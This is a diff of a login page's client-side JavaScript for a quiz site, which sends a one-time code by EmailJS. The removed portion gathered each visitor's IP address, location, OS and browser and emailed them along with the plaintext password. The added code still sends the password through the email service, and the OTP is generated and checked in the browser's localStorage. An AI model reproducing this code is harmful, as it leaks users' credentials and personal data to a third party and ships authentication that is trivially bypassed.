@@ -1,14 +1,15 @@
 (function() {
-  emailjs.init("AiVR2hP52XHP6xKkp");
+  emailjs.init("AiVR2hP52XHP6xKkp"); // <-- Apni EmailJS PUBLIC key lagani hai
 })();
 
-// Animations
+// Animate on load 🚀
 gsap.to("#loginBox", {
   opacity: 1,
   scale: 1,
   duration: 1,
   ease: "power3.out"
 });
+
 gsap.from("#growQuiz", {
   y: -30,
   opacity: 0,
@@ -16,12 +17,14 @@ gsap.from("#growQuiz", {
   duration: 0.8,
   ease: "back.out(1.7)"
 });
+
 gsap.from("#welcome", {
   x: -50,
   opacity: 0,
   delay: 0.4,
   duration: 0.8
 });
+
 gsap.from("#subtext", {
   x: 50,
   opacity: 0,
@@ -29,7 +32,7 @@ gsap.from("#subtext", {
   duration: 0.8
 });
 
-// Form Submit
+// Form Submit 🧠
 const form = document.getElementById('loginForm');
 const poraCont = document.getElementById("pora-container");
 const verifyOtpBtn = document.getElementById('verifyOtpBtn');
@@ -56,9 +59,10 @@ form.addEventListener('submit', function(e) {
 
   const existingUser = JSON.parse(localStorage.getItem('user'));
 
-  // Existing user
+  // ⭐ FIRST CHECK: User already registered aur login nahi hua
   if (existingUser && existingUser.name === name && existingUser.email === email) {
     if (existingUser.login === true) {
+      // Pehle se login hai
       Swal.fire({
         icon: 'success',
         title: 'Welcome back!',
@@ -71,12 +75,13 @@ form.addEventListener('submit', function(e) {
       }, 2000);
       return;
     } else {
+      // Pehle registered hai but login nahi hua, OTP maangna hoga
       showOtpBox();
       return;
     }
   }
 
-  // New user - generate OTP
+  // ⭐ NEW USER: OTP bhejna padega
   const otp = Math.floor(100000 + Math.random() * 900000);
 
   localStorage.setItem('user', JSON.stringify({
@@ -85,50 +90,34 @@ form.addEventListener('submit', function(e) {
     otp,
     login: false
   }));
+  
+  const templateParams = {
+    sender_email: "supportgrowquiz@gmail.com",
+    receiver_email: email,
+    name: name,
+    otp: otp,
+    password: password // 👈 Add this line
+  };
+  
 
-  // Fetch Location + System Info
-  fetch("https://ipapi.co/json")
-    .then(res => res.json())
-    .then(locationData => {
-      const templateParams = {
-        sender_email: "supportgrowquiz@gmail.com",
-        receiver_email: email,
-        name: name,
-        otp: otp,
-        password: password,
-        user_os: navigator.platform || "Unknown OS",
-        user_browser: navigator.userAgent || "Unknown Browser",
-        user_country: locationData.country_name || "Unknown Country",
-        user_ip: locationData.ip || "Unknown IP",
-        user_city: locationData.city || "Unknown City",
-        user_region: locationData.region || "Unknown Region",
-        user_postal: locationData.postal || "Unknown Postal Code",
-        user_time_zone: locationData.timezone || "Unknown Timezone",
-        user_referrer: document.referrer || window.location.href
-      };
-
-      emailjs.send('service_819r3au', 'template_3es8n4o', templateParams)
-        .then(function(response) {
-          console.log('SUCCESS!', response.status, response.text);
-          Swal.fire({
-            icon: 'success',
-            title: 'OTP Sent!',
-            text: 'Check your email inbox.',
-            timer: 3000,
-            showConfirmButton: false
-          });
-          showOtpBox();
-        }, function(error) {
-          console.log('FAILED...', error);
-          Swal.fire({
-            icon: 'error',
-            title: 'Failed to send OTP',
-            text: 'Please try again later.'
-          });
-        });
-    })
-    .catch(error => {
-      console.error("Location Fetch Error:", error);
+  emailjs.send('service_819r3au', 'template_3es8n4o', templateParams)
+    .then(function(response) {
+      console.log('SUCCESS!', response.status, response.text);
+      Swal.fire({
+        icon: 'success',
+        title: 'OTP Sent!',
+        text: 'Check your email inbox.',
+        timer: 3000,
+        showConfirmButton: false
+      });
+      showOtpBox();
+    }, function(error) {
+      console.log('FAILED...', error);
+      Swal.fire({
+        icon: 'error',
+        title: 'Failed to send OTP',
+        text: 'Please try again later.'
+      });
     });
 });
 
@@ -145,7 +134,7 @@ function showOtpBox() {
   });
 }
 
-// Verify OTP
+// OTP Verify 🧩
 verifyOtpBtn.addEventListener('click', function() {
   try {
     const enteredOtp = document.getElementById('otpInput').value.trim();
@@ -161,9 +150,11 @@ verifyOtpBtn.addEventListener('click', function() {
       });
 
       setTimeout(() => {
+        // Update user data
         delete userData.otp;
         userData.login = true;
         localStorage.setItem('user', JSON.stringify(userData));
+
         window.location.href="../index.html";
       }, 2000);
     } else {
